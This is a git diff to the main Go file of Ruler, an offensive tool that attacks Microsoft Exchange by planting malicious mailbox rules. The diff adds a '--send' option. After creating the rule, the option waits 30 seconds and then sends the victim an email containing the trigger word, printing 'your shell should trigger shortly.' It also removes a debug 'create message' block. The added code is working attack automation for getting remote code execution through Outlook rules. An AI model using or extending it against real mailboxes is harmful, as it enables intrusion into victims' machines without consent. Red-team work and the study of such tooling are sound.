@@ -5,6 +5,7 @@ import (
 	"flag"
 	"fmt"
 	"os"
+	"time"
 
 	"github.com/sensepost/ruler/autodiscover"
 	"github.com/sensepost/ruler/mapi"
@@ -103,7 +104,7 @@ func main() {
 	verbosePtr := flag.Bool("v", false, "Be verbose, show failures")
 	conscPtr := flag.Int("attempts", 2, "Number of attempts before delay")
 	delayPtr := flag.Int("delay", 5, "Delay between attempts")
-	createPtr := flag.Bool("create", false, "Create message")
+	autoSendPtr := flag.Bool("send", false, "Autosend an email once the rule has been created")
 	//pwnPtr := flag.Bool("pwn", false, "Used in conjuction with --rule. This will send an email from the victim to themself to trigger the rule")
 	flag.Parse()
 
@@ -125,6 +126,7 @@ func main() {
 	config.Insecure = *insecurePtr
 	config.Verbose = *verbosePtr
 	config.Admin = *adminPtr
+
 	autodiscover.SessionConfig = &config
 
 	var resp *utils.AutodiscoverResp
@@ -166,7 +168,7 @@ func main() {
 		exit(err)
 	} else if logon.MailboxGUID != nil {
 		fmt.Println("[*] And we are authenticated")
-		fmt.Println("[+] Mailbox GUID: ", logon.MailboxGUID)
+		fmt.Printf("[+] Mailbox GUID: %x\n", logon.MailboxGUID)
 		fmt.Println("[*] Openning the Inbox")
 
 		propertyTags := make([]mapi.PropertyTag, 8)
@@ -218,27 +220,6 @@ func main() {
 			}
 
 		}
-		if *createPtr == true {
-			fmt.Println("[*] Create message")
-			/*
-				PR_DISPLAY_NAME, PR_EMAIL_ADDRESS, PR_NT_USER_NAME, PR_CONTENT_COUNT,
-				PR_LOCALE_ID, PR_MESSAGE_SIZE, PR_MESSAGE_SIZE_EXTENDED,
-				PR_ASSOC_CONTENT_COUNT, PR_LAST_LOGON_TIME, PR_LAST_LOGOFF_TIME,
-				PR_STORAGE_LIMIT_INFORMATION, PR_INSTANCE_KEY
-			*/
-			propertyTags := make([]mapi.PropertyTag, 3)
-			propertyTags[0] = mapi.PidTagDisplayName
-			propertyTags[1] = mapi.PidTagMemberName
-			propertyTags[2] = mapi.PidTagLocaleID
-
-			a, _ := mapi.GetFolder(mapi.INBOX, propertyTags)
-
-			rows, _ := mapi.DecodeGetTableResponse(a.RopBuffer, propertyTags)
-			for _, r := range rows.RowData {
-				fmt.Println(r.ValueArray)
-			}
-			exit(nil)
-		}
 
 		//Create a new rule
 		if *ruleName != "" {
@@ -259,6 +240,26 @@ func main() {
 			fmt.Printf("[+] Found %d rules\n", len(rules))
 			for _, v := range rules {
 				fmt.Printf("Rule: %s RuleID: %x\n", string(v.RuleName), v.RuleID)
+			}
+
+			if *autoSendPtr == true {
+				fmt.Println("[*] Auto Send enabled, wait 30 seconds before sending email (synchronisation)")
+				time.Sleep(time.Second * (time.Duration)(30))
+				fmt.Println("[*] Sending email")
+
+				_, er := mapi.GetFolder(mapi.OUTBOX, nil)
+				if er != nil {
+					exit(er)
+				}
+				_, er = mapi.SendMessage(*triggerWord)
+				if er != nil {
+					exit(er)
+				}
+				//mapi.ReleaseObject(0x00)
+				//mapi.SendMessage(message.MessageID)
+
+				fmt.Println("[*] Message sent, your shell should trigger shortly.")
+				exit(nil)
 			}
 			exit(nil)
 		}
